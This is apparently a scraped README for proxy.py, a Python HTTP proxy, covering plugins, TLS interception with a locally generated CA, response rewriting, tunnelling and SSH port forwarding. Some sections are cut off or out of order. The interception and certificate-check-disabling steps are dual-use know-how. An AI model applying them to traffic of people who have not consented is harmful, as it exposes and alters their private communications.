`docker` image is currently broken on `macOS` due to incompatibility with [vpnkit](https://github.com/moby/vpnkit/issues/469).

## Using HomeBrew

Updated formulae for `HomeBrew` are maintained in `develop` branch under the `helper/homebrew` directory.

* `stable` formulae installs the package from `master` branch.
* `develop` formulae installs the package from `develop` branch.

### Stable Version with HomeBrew

```
❯ brew install https://raw.githubusercontent.com/abhinavsingh/proxy.py/develop/helper/homebrew/stable/proxy.rb
```

### Development Version with HomeBrew

```
❯ brew install https://raw.githubusercontent.com/abhinavsingh/proxy.py/develop/helper/homebrew/develop/proxy.rb
```

# Start proxy.py

## From command line when installed using PIP

When `proxy.py` is installed using `pip`,
an executable named `proxy` is placed under your `$PATH`.

### Run it

Simply type `proxy` on command line to start with default configuration.

```
❯ proxy
...[redacted]... - Loaded plugin proxy.http.proxy.HttpProxyPlugin
...[redacted]... - Started 8 threadless workers
...[redacted]... - Started 8 acceptors
...[redacted]... - Listening on 127.0.0.1:8899
```

### Understanding logs

Things to notice from above logs:

* `Loaded plugin`

  + `proxy.py` will load `proxy.http.proxy.HttpProxyPlugin` by default
  + As name suggests, this core plugin adds `http(s)` proxy server capabilities to `proxy.py` instance
* `Started N threadless workers`

  + By default, `proxy.py` will start as many worker processes as there are CPU cores on the machine
  + Use `--num-workers` flag to customize number of worker processes
  + See [Threads vs Threadless](#threads-vs-threadless) to understand how to control execution mode
* `Started N acceptors`

  + By default, `proxy.py` will start as many acceptor processes as there are CPU cores on the machine
  + Use `--num-acceptors` flag to customize number of acceptor processes
  + See [High Level Architecture](#high-level-architecture) to understand relationship between acceptors and workers
* `Started server on ::1:8899`

  + By default, `proxy.py` listens on IPv6 `::1`, which is equivalent of IPv4 `127.0.0.1`
  + If you want to access `proxy.py` from external host, use `--hostname ::` or `--hostname 0.0.0.0` or bind to any other interface available on your machine.
  + See [CustomNetworkInterface](#customnetworkinterface) for how to customize `proxy.py` *public IP seen by upstream servers*.
* `Port 8899`

  + Use `--port` flag to customize default TCP port.

### Enable DEBUG logging

All the logs above are `INFO` level logs, default `--log-level` for `proxy.py`

Lets start `proxy.py` with `DEBUG` level logging:

```
❯ proxy --log-level d
...[redacted]... - Open file descriptor soft limit set to 1024
...[redacted]... - Loaded plugin proxy.http_proxy.HttpProxyPlugin
...[redacted]... - Started 8 workers
...[redacted]... - Started server on ::1:8899
```

You can use single letter to customize log level. Example:

* `d = DEBUG`
* `i = INFO`
* `w = WARNING`
* `e = ERROR`
* `c = CRITICAL`

As we can see from the above logs, before starting up:

* `proxy.py` tried to set open file limit `ulimit` on the system
* Default value for `--open-file-limit` used is `1024`
* `--open-file-limit` flag is a no-op on `Windows` operating systems

See [flags](#flags) for full list of available configuration options.

## From command line using repo source

If you are trying to run `proxy.py` from source code,
there is no binary file named `proxy` in the source code.

To start `proxy.py` from source code follow these instructions:

* Clone repo

  ```
  ❯ git clone https://github.com/abhinavsingh/proxy.py.git
  ❯ cd proxy.py
  ```
* Create a Python 3 virtual env

  ```
  ❯ python3 -m venv venv
  ❯ source venv/bin/activate
  ```
* Install deps

  ```
  ❯ make lib-dep
  ```
* Generate `proxy/common/_scm_version.py`

  NOTE: *Following step is not necessary for editable installs.*

  This file writes SCM detected version to `proxy/common/_scm_version.py` file.

  ```
  ❯ ./write-scm-version.sh
  ```
* Optionally, run tests

  ```
  ❯ make
  ```
* Run `proxy.py`

  ```
  ❯ python -m proxy
  ```

See [Plugin Developer and Contributor Guide](#plugin-developer-and-contributor-guide)
if you plan to work with `proxy.py` source code.

## Docker image

### Customize startup flags

By default `docker` binary is started with IPv4 networking flags:

```
--hostname 0.0.0.0 --port 8899

```

You can override flag from command line when starting the docker container. For example, to check `proxy.py` version within the docker container, run:

```
❯ docker run -it \
    -p 8899:8899 \
    --rm abhinavsingh/proxy.py:latest \
    -v

```

# Plugin Examples

* See [plugin](https://github.com/abhinavsingh/proxy.py/tree/develop/proxy/plugin) module for full code.
* All the bundled plugin examples also works with `https` traffic
  + Require additional flags and certificate generation
  + See [TLS Interception](#tls-interception).
* Plugin examples are also bundled with Docker image.
  + See [Customize startup flags](#customize-startup-flags) to try plugins with Docker image.

## HTTP Proxy Plugins

### ShortLinkPlugin

Add support for short links in your favorite browsers / applications.

[![Shortlink Plugin](https://raw.githubusercontent.com/abhinavsingh/proxy.py/develop/shortlink.gif)](https://github.com/abhinavsingh/proxy.py#user-content-shortlinkplugin)

Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.ShortLinkPlugin
```

Now you can speed up your daily browsing experience by visiting your
favorite website using single character domain names :). This works
across all browsers.

Following short links are enabled by default:

| Short Link | Destination URL |
| --- | --- |
| a/ | `amazon.com` |
| i/ | `instagram.com` |
| l/ | `linkedin.com` |
| f/ | `facebook.com` |
| g/ | `google.com` |
| t/ | `twitter.com` |
| w/ | `web.whatsapp.com` |
| y/ | `youtube.com` |
| proxy/ | `localhost:8899` |

### ModifyPostDataPlugin

Modifies POST request body before sending request to upstream server.

Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.ModifyPostDataPlugin
```

By default plugin replaces POST body content with hard-coded `b'{"key": "modified"}'`
and enforced `Content-Type: application/json`.

Verify the same using `curl -x localhost:8899 -d '{"key": "value"}' http://httpbin.org/post`

```
{
  "args": {},
  "data": "{\"key\": \"modified\"}",
  "files": {},
  "form": {},
  "headers": {
    "Accept": "*/*",
    "Content-Length": "19",
    "Content-Type": "application/json",
    "Host": "httpbin.org",
    "User-Agent": "curl/7.54.0"
  },
  "json": {
    "key": "modified"
  },
  "origin": "1.2.3.4, 5.6.7.8",
  "url": "https://httpbin.org/post"
}
```

Note following from the response above:

1. POST data was modified `"data": "{\"key\": \"modified\"}"`.
   Original `curl` command data was `{"key": "value"}`.
2. Our `curl` command did not add any `Content-Type` header,
   but our plugin did add one `"Content-Type": "application/json"`.
   Same can also be verified by looking at `json` field in the output above:
   ```
   "json": {
    "key": "modified"
   },

   ```
3. Our plugin also added a `Content-Length` header to match length
   of modified body.

### MockRestApiPlugin

Mock responses for your server REST API.
Use to test and develop client side applications
without need of an actual upstream REST API server.

Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.ProposedRestApiPlugin
```

Verify mock API response using `curl -x localhost:8899 http://api.example.com/v1/users/`

```
{"count": 2, "next": null, "previous": null, "results": [{"email": "you@example.com", "groups": [], "url": "api.example.com/v1/users/1/", "username": "admin"}, {"email": "someone@example.com", "groups": [], "url": "api.example.com/v1/users/2/", "username": "admin"}]}
```

Verify the same by inspecting `proxy.py` logs:

```
... [redacted] ... - access_log:1210 - ::1:64792 - GET None:None/v1/users/ - None None - 0 byte
```

Access log shows `None:None` as server `ip:port`. `None` simply means that
the server connection was never made, since response was returned by our plugin.

Now modify `ProposedRestApiPlugin` to returns REST API mock
responses as expected by your clients.

### RedirectToCustomServerPlugin

Redirects all incoming `http` requests to custom web server.
By default, it redirects client requests to inbuilt web server,
also running on `8899` port.

Start `proxy.py` and enable inbuilt web server:

```
❯ proxy \
    --enable-web-server \
    --plugins proxy.plugin.RedirectToCustomServerPlugin
```

Verify using `curl -v -x localhost:8899 http://google.com`

```
... [redacted] ...
< HTTP/1.1 404 NOT FOUND
< Server: proxy.py v1.0.0
< Connection: Close
<
* Closing connection 0

```

Above `404` response was returned from `proxy.py` web server.

Verify the same by inspecting the logs for `proxy.py`.
Along with the proxy request log, you must also see a http web server request log.

```
... [redacted] ... - access_log:1241 - ::1:49525 - GET /
... [redacted] ... - access_log:1157 - ::1:49524 - GET localhost:8899/ - 404 NOT FOUND - 70 bytes

```

### FilterByUpstreamHostPlugin

Drops traffic by inspecting upstream host.
By default, plugin drops traffic for `facebook.com` and `www.facebok.com`.

Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.FilterByUpstreamHostPlugin
```

Verify using `curl -v -x localhost:8899 http://facebook.com`:

```
... [redacted] ...
< HTTP/1.1 418 I'm a tea pot
< Proxy-agent: proxy.py v1.0.0
* no chunk, no close, no size. Assume close to signal end
<
* Closing connection 0
```

Above `418 I'm a tea pot` is sent by our plugin.

Verify the same by inspecting logs for `proxy.py`:

```
... [redacted] ... - handle_readables:1347 - HttpProtocolException type raised
Traceback (most recent call last):
... [redacted] ...
... [redacted] ... - access_log:1157 - ::1:49911 - GET None:None/ - None None - 0 bytes
```

### CacheResponsesPlugin

Caches Upstream Server Responses.

Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.CacheResponsesPlugin
```

You may also use the `--cache-requests` flag to enable request packet caching for inspection.

Verify using `curl -v -x localhost:8899 http://httpbin.org/get`:

```
... [redacted] ...
< HTTP/1.1 200 OK
< Access-Control-Allow-Credentials: true
< Access-Control-Allow-Origin: *
< Content-Type: application/json
< Date: Wed, 25 Sep 2019 02:24:25 GMT
< Referrer-Policy: no-referrer-when-downgrade
< Server: nginx
< X-Content-Type-Options: nosniff
< X-Frame-Options: DENY
< X-XSS-Protection: 1; mode=block
< Content-Length: 202
< Connection: keep-alive
<
{
  "args": {},
  "headers": {
    "Accept": "*/*",
    "Host": "httpbin.org",
    "User-Agent": "curl/7.54.0"
  },
  "origin": "1.2.3.4, 5.6.7.8",
  "url": "https://httpbin.org/get"
}
* Connection #0 to host localhost left intact
```

Get path to the cache file from `proxy.py` logs:

```
... [redacted] ... - GET httpbin.org:80/get - 200 OK - 556 bytes
... [redacted] ... - Cached response at /var/folders/k9/x93q0_xn1ls9zy76m2mf2k_00000gn/T/httpbin.org-1569378301.407512.txt
```

Verify contents of the cache file `cat /path/to/your/cache/httpbin.org.txt`

```
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
Content-Type: application/json
Date: Wed, 25 Sep 2019 02:24:25 GMT
Referrer-Policy: no-referrer-when-downgrade
Server: nginx
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Content-Length: 202
Connection: keep-alive

{
  "args": {},
  "headers": {
    "Accept": "*/*",
    "Host": "httpbin.org",
    "User-Agent": "curl/7.54.0"
  },
  "origin": "1.2.3.4, 5.6.7.8",
  "url": "https://httpbin.org/get"
}
```

### CacheByResponseType

`CacheResponsesPlugin` plugin can also automatically cache responses by `content-type`.
To try this, you must be running under [TLS Interception](#tls-interception) mode
and then pass `--cache-by-content-type` flag. Example:

```
❯ proxy \
    --plugins proxy.plugin.CacheResponsesPlugin \
    --cache-by-content-type \
    --ca-key-file ca-key.pem \
    --ca-cert-file ca-cert.pem \
    --ca-signing-key ca-signing-key.pem
```

Make a few requests to the proxy server and you shall see data under `~/.proxy/cache` directory.

You should see 2 folders:

* `content`: Contains parsed `jpg`, `css`, `js`, `html`, `pdf` etc by content type
* `responses`: Contains raw responses as received *(of-course decrypted because of interception)*

### ManInTheMiddlePlugin

Modifies upstream server responses.

Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.ManInTheMiddlePlugin
```

Verify using `curl -v -x localhost:8899 http://google.com`:

```

Hello from man in the middle
```

Response body `Hello from man in the middle` is sent by our plugin.

### ProxyPoolPlugin

Forward incoming proxy requests to a set of upstream proxy servers.

Let's start 2 upstream proxies first. To simulate upstream proxies,
start `proxy.py` on port `9000` and `9001`

```
❯ proxy --port 9000
```

```
❯ proxy --port 9001
```

Now, start `proxy.py` with `ProxyPoolPlugin` (on default `8899` port),
pointing to our upstream proxies at `9000` and `9001` port.

```
❯ proxy \
    --plugins proxy.plugin.ProxyPoolPlugin \
    --proxy-pool localhost:9000 \
    --proxy-pool localhost:9001
```

Make a curl request via `8899` proxy:

`curl -v -x localhost:8899 http://httpbin.org/get`

Verify that `8899` proxy forwards requests to upstream proxies
by checking respective logs.

If an upstream proxy require credentials, pass them as arguments. Example:

`--proxy-pool user:pass@upstream.proxy:port`

### FilterByClientIpPlugin

Reject traffic from specific IP addresses. By default this
plugin blocks traffic from `127.0.0.1` and `::1`.

Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.FilterByClientIpPlugin
```

Send a request using `curl -v -x localhost:8899 http://google.com`:

```
... [redacted] ...
> Proxy-Connection: Keep-Alive
>
< HTTP/1.1 418 I'm a tea pot
< Connection: close
<
* Closing connection 0
```

Modify plugin to your taste e.g. Allow specific IP addresses only.

### ModifyChunkResponsePlugin

This plugin demonstrate how to modify chunked encoded responses. In able to do so, this plugin uses `proxy.py` core to parse the chunked encoded response. Then we reconstruct the response using custom hard-coded chunks, ignoring original chunks received from upstream server.

Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.ModifyChunkResponsePlugin
```

Verify using `curl -v -x localhost:8899 http://httpbin.org/stream/5`:

```
... [redacted] ...
modify
chunk
response
plugin
* Connection #0 to host localhost left intact
* Closing connection 0
```

Modify `ModifyChunkResponsePlugin` to your taste. Example, instead of sending hard-coded chunks, parse and modify the original `JSON` chunks received from the upstream server.

### ModifyRequestHeaderPlugin

This plugin demonstrate how to modify outgoing HTTPS request headers under TLS interception mode.

Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.ModifyRequestHeaderPlugin \
    ... [TLS interception flags] ...
```

Verify using `curl -x localhost:8899 --cacert ca-cert.pem https://httpbin.org/get`:

```
{
  "args": {},
  "headers": {
    ... [redacted] ...,
    "X-Proxy-Py-Version": "2.4.4rc6.dev15+gf533c711"
  },
  ... [redacted] ...
}
```

### CloudflareDnsResolverPlugin

This plugin uses `Cloudflare` hosted `DNS-over-HTTPS` [API](https://developers.cloudflare.com/1.1.1.1/encrypted-dns/dns-over-https/make-api-requests/dns-json) (json).

`DoH` mandates a HTTP2 compliant client. Unfortunately `proxy.py`
does not provide that yet, so we use a dependency. Install it:

```
❯ pip install "httpx[http2]"
```

Now start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.CloudflareDnsResolverPlugin
```

By default, `CloudflareDnsResolverPlugin` runs in `security` mode and provides malware protection.
Use `--cloudflare-dns-mode family` to also enable adult content protection too.

### CustomDnsResolverPlugin

This plugin demonstrate how to use a custom DNS resolution implementation with `proxy.py`.
This example plugin currently uses Python's in-built resolution mechanism. Customize code
to your taste. Example, query your custom DNS server, implement `DoH` or other mechanisms.

Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.CustomDnsResolverPlugin
```

### CustomNetworkInterface

`HttpProxyBasePlugin.resolve_dns` callback can also be used to configure `network interface` which must be used as the `source_address` for connection to the upstream server.

See [this thread](https://github.com/abhinavsingh/proxy.py/issues/535#issuecomment-961510862)
for more details.

PS: There is no plugin named, but [CustomDnsResolverPlugin](#customdnsresolverplugin)
can be easily customized according to your needs.

### ProgramNamePlugin

Attempts to resolve program `(application)` name for proxy requests originating from the local machine.
If identified, client IP in the access logs is replaced with program name.

Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.ProgramNamePlugin
```

Make a request using `curl`:

```
❯ curl -v -x localhost:8899 https://httpbin.org/get
```

You must see log lines like this:

```
... [redacted] ... - [I] server.access_log:419 - curl:58096 - CONNECT httpbin.org:443 - 6010 bytes - 1824.62ms
```

Notice `curl` in-place of `::1` or `127.0.0.1` as client IP.

## HTTP Web Server Plugins

### Web Server Route

Demonstrates inbuilt web server routing using plugin.

Start `proxy.py` as:

```
❯ proxy --enable-web-server \
    --plugins proxy.plugin.WebServerPlugin
```

Verify using `curl -v localhost:8899/http-route-example`, should return:

```
HTTP route response
```

## Reverse Proxy Plugins

Extends in-built Web Server to add Reverse Proxy capabilities.

### Reverse Proxy

Start `proxy.py` as:

```
❯ proxy --enable-reverse-proxy \
    --plugins proxy.plugin.ReverseProxyPlugin
```

With default configuration, `ReverseProxyPlugin` plugin is equivalent to
following `Nginx` config:

```
location /get {
    proxy_pass http://httpbin.org/get;
}
```

Verify using `curl -v localhost:8899/get`:

```
{
  "args": {},
  "headers": {
    "Accept": "*/*",
    "Host": "localhost",
    "User-Agent": "curl/7.64.1"
  },
  "origin": "1.2.3.4, 5.6.7.8",
  "url": "https://localhost/get"
}
```

#### Rewrite Host Header

With above example, you may sometimes see:

```
>
* Empty reply from server
* Closing connection
curl: (52) Empty reply from server
```

This is happenening because our default reverse proxy plugin `ReverseProxyPlugin` is configured
with a `http` and a `https` upstream server. And, by default `ReverseProxyPlugin` preserves the
original host header. While this works with `https` upstreams, this doesn't work reliably with
`http` upstreams. To work around this problem use the `--rewrite-host-header` flags.

Example:

```
❯ proxy --enable-reverse-proxy \
    --plugins proxy.plugin.ReverseProxyPlugin \
    --rewrite-host-header
```

This will ensure that `Host` header field is set as `httpbin.org` and works with both `http` and
`https` upstreams.

> NOTE: Whether to use `--rewrite-host-header` or not depends upon your use-case.

## Plugin Ordering

When using multiple plugins, depending upon plugin functionality,
it might be worth considering the order in which plugins are passed
on the command line.

Plugins are called in the same order as they are passed. Example,
say we are using both `FilterByUpstreamHostPlugin` and
`RedirectToCustomServerPlugin`. Idea is to drop all incoming `http`
requests for `facebook.com` and `www.facebook.com` and redirect other
`http` requests to our inbuilt web server.

Hence, in this scenario it is important to use
`FilterByUpstreamHostPlugin` before `RedirectToCustomServerPlugin`.
If we enable `RedirectToCustomServerPlugin` before `FilterByUpstreamHostPlugin`,
`facebook` requests will also get redirected to inbuilt web server,
instead of being dropped.

# End-to-End Encryption

By default, `proxy.py` uses `http` protocol for communication with clients e.g. `curl`, `browser`. For enabling end-to-end encrypting using `tls` / `https` first generate certificates. **Checkout** the repository and run:

```
make https-certificates
```

Start `proxy.py` as:

```
❯ proxy \
    --cert-file https-cert.pem \
    --key-file https-key.pem
```

Verify using `curl -x https://localhost:8899 --proxy-cacert https-cert.pem https://httpbin.org/get`:

```
{
  "args": {},
  "headers": {
    "Accept": "*/*",
    "Host": "httpbin.org",
    "User-Agent": "curl/7.54.0"
  },
  "origin": "1.2.3.4, 5.6.7.8",
  "url": "https://httpbin.org/get"
}
```

If you want to avoid passing `--proxy-cacert` flag, also consider signing generated SSL certificates. Example:

First, generate CA certificates:

```
make ca-certificates
```

Then, sign SSL certificate:

```
make sign-https-certificates
```

Now restart the server with `--cert-file https-signed-cert.pem` flag. Note that you must also trust generated `ca-cert.pem` in your system keychain.

# TLS Interception

By default, `proxy.py` will not decrypt `https` traffic between client and server.
To enable TLS interception first generate root CA certificates:

```
❯ make ca-certificates
```

Lets also enable `CacheResponsePlugin` so that we can verify decrypted
response from the server. Start `proxy.py` as:

```
❯ proxy \
    --plugins proxy.plugin.CacheResponsesPlugin \
    --ca-key-file ca-key.pem \
    --ca-cert-file ca-cert.pem \
    --ca-signing-key-file ca-signing-key.pem
```

[![NOTE](https://camo.githubusercontent.com/3d2ac3d7e4bf0736a63dbd698b95271b0caa0b4ad40db525e4a55f75197ceca8/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f6c6162656c3d4d61634f53266d6573736167653d6e6f746526636f6c6f723d79656c6c6f77)](https://github.com/abhinavsingh/proxy.py#user-content-flags) Also provide explicit CA bundle path needed for validation of peer certificates. See `--ca-file` flag.

Verify TLS interception using `curl`

```
❯ curl -v -x localhost:8899 --cacert ca-cert.pem https://httpbin.org/get
```

```
*  issuer: C=US; ST=CA; L=SanFrancisco; O=proxy.py; OU=CA; CN=Proxy PY CA; emailAddress=proxyca@mailserver.com
*  SSL certificate verify ok.
> GET /get HTTP/1.1
... [redacted] ...
< Connection: keep-alive
<
{
  "args": {},
  "headers": {
    "Accept": "*/*",
    "Host": "httpbin.org",
    "User-Agent": "curl/7.54.0"
  },
  "origin": "1.2.3.4, 5.6.7.8",
  "url": "https://httpbin.org/get"
}
```

The `issuer` line confirms that response was intercepted.

Also verify the contents of cached response file. Get path to the cache
file from `proxy.py` logs.

`❯ cat /path/to/your/tmp/directory/httpbin.org-1569452863.924174.txt`

```
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true

{
  "args": {},
  "headers": {
    "Accept": "*/*",
    "Host": "httpbin.org",
    "User-Agent": "curl/7.54.0"
  },
  "origin": "1.2.3.4, 5.6.7.8",
  "url": "https://httpbin.org/get"
}
```

Viola!!! If you remove CA flags, encrypted data will be found in the
cached file instead of plain text.

Now use CA flags with other
[plugin examples](#plugin-examples) to see them work with `https` traffic.

## Insecure TLS Interception

To intercept TLS traffic from a server using a self-signed certificate
add the `--insecure-tls-interception` flag to disable mandatory TLS certificate validation.

NOTE: This flag disables certificate check for all servers.

## TLS Interception With Docker

Important notes about TLS Interception with Docker container:

* Since `v2.2.0`, `proxy.py` docker container also ships with `openssl`. This allows `proxy.py`
  to generate certificates on the fly for TLS Interception.
* For security reasons, `proxy.py` docker container does not ship with
  CA certificates.

Here is how to start a `proxy.py` docker container
with TLS Interception:

1. Generate CA certificates on host computer

   ```
   ❯ make ca-certificates
   ```
2. Copy all generated certificates into a separate directory. We'll later mount this directory into our docker container

   ```
   ❯ mkdir /tmp/ca-certificates
   ❯ cp ca-cert.pem ca-key.pem ca-signing-key.pem /tmp/ca-certificates
   ```
3. Start docker container

   ```
   ❯ docker run -it --rm \
       -v /tmp/ca-certificates:/tmp/ca-certificates \
       -p 8899:8899 \
       abhinavsingh/proxy.py:latest \
       --hostname 0.0.0.0 \
       --plugins proxy.plugin.CacheResponsesPlugin \
       --ca-key-file /tmp/ca-certificates/ca-key.pem \
       --ca-cert-file /tmp/ca-certificates/ca-cert.pem \
       --ca-signing-key /tmp/ca-certificates/ca-signing-key.pem
   ```
   * `-v /tmp/ca-certificates:/tmp/ca-certificates` flag mounts our CA certificate directory in container environment
   * `--plugins proxy.plugin.CacheResponsesPlugin` enables `CacheResponsesPlugin` so that we can inspect intercepted traffic
   * `--ca-*` flags enable TLS Interception.
4. From another terminal, try TLS Interception using `curl`. You can omit `--cacert` flag if CA certificate is already trusted by the system.

   ```
   ❯ curl -v \
       --cacert ca-cert.pem \
       -x 127.0.0.1:8899 \
       https://httpbin.org/get
   ```
5. Verify `issuer` field from response headers.

   ```
   * Server certificate:
   *  subject: CN=httpbin.org; C=NA; ST=Unavailable; L=Unavailable; O=Unavailable; OU=Unavailable
   *  start date: Jun 17 09:26:57 2020 GMT
   *  expire date: Jun 17 09:26:57 2022 GMT
   *  subjectAltName: host "httpbin.org" matched cert's "httpbin.org"
   *  issuer: CN=example.com
   *  SSL certificate verify ok.
   ```
6. Back on docker terminal, copy response dump path logs.

   ```
   ...[redacted]... [I] access_log:338 - 172.17.0.1:56498 - CONNECT httpbin.org:443 - 1031 bytes - 1216.70 ms
   ...[redacted]... [I] close:49 - Cached response at /tmp/httpbin.org-ae1a927d064e4ab386ea319eb38fe251.txt
   ```
7. In another terminal, `cat` the response dump:

   ```
   ❯ docker exec -it $(docker ps | grep proxy.py | awk '{ print $1 }') cat /tmp/httpbin.org-ae1a927d064e4ab386ea319eb38fe251.txt
   HTTP/1.1 200 OK
   ...[redacted]...
   {
     ...[redacted]...,
     "url": "http://httpbin.org/get"
   }
   ```

# GROUT (NGROK Alternative)

1. `grout` is a drop-in alternative for `ngrok` and `frp`
2. `grout` comes packaged within `proxy.py`

## Grout Usage

```
❯ grout
NAME:
  grout - securely tunnel local files, folders and services to public URLs

USAGE:
  grout route [name]

DESCRIPTION:
  grout exposes local networked services behinds NATs and firewalls to the
  public internet over a secure tunnel. Share local folders, directories and websites,
  build/test webhook consumers and self-host personal services to public URLs.

EXAMPLES:
  Share Files and Folders:
    grout C:\path\to\folder                          # Share a folder on your system
    grout /path/to/folder                            # Share a folder on your system
    grout /path/to/folder --basic-auth user:pass     # Add authentication for shared folder
    grout /path/to/photo.jpg                         # Share a specific file on your system

  Expose HTTP, HTTPS and Websockets:
    grout http://localhost:9090                      # Expose HTTP service running on port 9090
    grout https://localhost:8080                     # Expose HTTPS service running on port 8080
    grout https://localhost:8080 --path /worker/     # Expose only certain paths of HTTPS service on port 8080
    grout https://localhost:8080 --basic-auth u:p    # Add authentication for exposed HTTPS service on port 8080

  Expose TCP Services:
    grout tcp://:6379                                # Expose Redis service running locally on port 6379
    grout tcp://:22                                  # Expose SSH service running locally on port 22

  Custom URLs:
    grout https://localhost:8080 abhinavsingh        # Custom URL for HTTPS service running on port 8080
    grout tcp://:22 abhinavsingh                     # Custom URL for SSH service running locally on port 22

  Custom Domains:

## Grout Authentication

Grout supports authentication to protect your files, folders and services from unauthorized
access. Use `--basic-auth` flag to enforce authentication. Example:

```
grout /path/to/folder --basic-auth user:pass
grout https://localhost:8080 --basic-auth u:p
```

## Grout Paths

By default, Grout allows access to all paths on the services. Use `--path` flag to restrict
access to only certain paths on your web service. Example:

```
grout https://localhost:8080 --path /worker/
grout https://localhost:8080 --path /webhook/ --path /callback/
```

## Grout Wildcard Domains

By default, Grout client serves incoming traffic on a dedicated subdomain.
However, some services (e.g. Kubernetes) may want to serve traffic on adhoc subdomains.
Starting a dedicated Grout client for every adhoc subdomain may not be a practical solution.

For such scenarios, Grout supports wildcard domains. Here is how to configure your own
wildcard domain for use with Grout clients.

1. Choose a domain e.g. `custom.example.com`
2. Your service wants to serve traffic for `custom.example.com` and `*.custom.example.com`
3. If you plan on using `https://`, you need to setup a load balancer:
   * Setup a HTTPS load balancer (LB)
   * Configure LB with certificate generated for `custom.example.com` and `*.custom.example.com`
   * Point traffic to Grout service public IP addresses
4. Contact Grout team at support@jaxl.com to whitelist `custom.example.com`. Grout team will make
   sure you really own the domain and you have configured a valid SSL certificate as described above

Start Grout with `--wildcard` flag. Example:

```
grout https://localhost:8080 custom.example.com --wildcard
2024-08-05 18:24:59,294 - grout - Logged in as someone@gmail.com
2024-08-05 18:25:03,159 - setup - Grouting https://*.custom.domain.com
```

## Grout Wildcard Domain Routing Based Upon "Host" Header

> Only available with `--wildcard`

Along with the default route you can also provide additional routes which takes precedence when the host field matches. Example:

```
grout https://localhost:8080 custom.example.com \
  --wildcard \
  --tunnel-route-url stream.example.com=http://localhost:7001
```

You can provide multiple custom routes by repeating this flag.

## Grout Client Plugin

`GroutClientBasePlugin` allows you to dynamically route traffic to different upstreams. Below is a simple implementation with some description about how to use it.

```
class GroutClientPlugin(GroutClientBasePlugin):

    def resolve_route(
        self,
        route: str,
        request: HttpParser,
        origin: HostPort,
        server: HostPort,
    ) -> Tuple[Optional[str], HttpParser]:
        print(request, origin, server, '->', route)
        print(request.header(b'host'), request.path)
        #
        # Here, we send traffic to localhost:7001 irrespective
        # of the original "route" value provided to the grout
        # client OR any custom host:upstream mapping provided
        # through the --tunnel-route-url flags (when using
        # --wildcard).
        #
        # Optionally, you can also strip path before
        # sending traffic to upstrem, like:
        # request.path = b"/"
        #
        # To drop the request, simply return None for route
        # return None, request
        #
        return 'http://localhost:7001', request
```

See [grout\_client.py](https://github.com/abhinavsingh/proxy.py/blob/develop/proxy/plugin/grout_client.py) for more information. To try this out, start by passing `--plugin proxy.plugin.grout_client.GroutClientPlugin` when starting the grout client.

## Grout using Docker

```
❯ docker run --rm -it \
  --entrypoint grout \
  -v ~/.proxy:/root/.proxy \
  abhinavsingh/proxy.py:latest \
  http://host.docker.internal:29876
```

Above:

* We changed `--entrypoint` to `grout`
* We replaced `localhost` with `host.docker.internal`, so that `grout` can route traffic to port `29876` running on the host machine
* *(Optional)* Mount host machine `~/.proxy` folder, so that `grout` credentials can persist across container restarts

## How Grout works

* `grout` infrastructure has 2 components: client and server
* `grout` client has 2 components: a thin and a thick client
* `grout` thin client is part of open source `proxy.py` (BSD 3-Clause License)
* `grout` thick client and servers are hosted at [jaxl.io](https://jaxl.io)
  and a copyright of [Jaxl Innovations Private Limited](https://jaxl.com)
* `grout` server has 3 components: a registry server, a reverse proxy server and a tunnel server

## Self-Hosted `grout`

* `grout` thick client and servers can also be hosted on your GCP, AWS, Cloud infrastructures
* With a self-hosted version, your traffic flows through the network you control and trust
* `grout` developers at [jaxl.io](https://jaxl.io) provides GCP, AWS, Docker images for self-hosted solutions
* Please drop an email at support@jaxl.com to get started.

* Requested `remote` port is forwarded over the SSH connection.
* `proxy.py` running on the `localhost` handles and responds to
  `remote` proxy requests.

### Requirements

1. `localhost` MUST have SSH access to the `remote` server
2. `remote` server MUST be configured to proxy HTTP(s) requests
   through the forwarded port number e.g. `:8900`.
   * `remote` and `localhost` ports CAN be same e.g. `:8899`.
   * `:8900` is chosen in ascii art for differentiation purposes.

### Try it

Start `proxy.py` as:

```
❯ # On localhost
❯ proxy --enable-ssh-tunnel \
    --tunnel-username username \
    --tunnel-hostname ip.address.or.domain.name \
    --tunnel-port 22 \
    --tunnel-remote-port 8899 \
    --tunnel-ssh-key /path/to/ssh/private.key \
    --tunnel-ssh-key-passphrase XXXXX
...[redacted]... [I] listener.setup:97 - Listening on 127.0.0.1:8899
...[redacted]... [I] pool.setup:106 - Started 16 acceptors in threadless (local) mode
...[redacted]... [I] transport._log:1873 - Connected (version 2.0, client OpenSSH_7.6p1)
...[redacted]... [I] transport._log:1873 - Authentication (publickey) successful!
...[redacted]... [I] listener.setup:116 - SSH connection established to ip.address.or.domain.name:22...
...[redacted]... [I] listener.start_port_forward:91 - :8899 forwarding successful...
```

Make a HTTP proxy request on `remote` server and
verify that response contains public IP address of `localhost` as origin:

```
❯ # On remote
❯ curl -x 127.0.0.1:8899 http://httpbin.org/get
{
  "args": {},
  "headers": {
    "Accept": "*/*",
    "Host": "httpbin.org",
    "User-Agent": "curl/7.54.0"
  },
  "origin": "x.x.x.x, y.y.y.y",
  "url": "https://httpbin.org/get"
}
```

Also, verify that `proxy.py` logs on `localhost` contains `remote` IP as client IP.

```
access_log:328 - remote:52067 - GET httpbin.org:80
```

## Proxy Local Requests Remotely

```
                        |
+------------+          |     +----------+
|   LOCAL    |          |     |  REMOTE  |
|   HOST     | === SSH =====> |  SERVER  |
+------------+          |     +----------+
                        |     :8899 proxy.py
                        |
                    FIREWALL
                 (allow tcp/22)

```

Not planned.

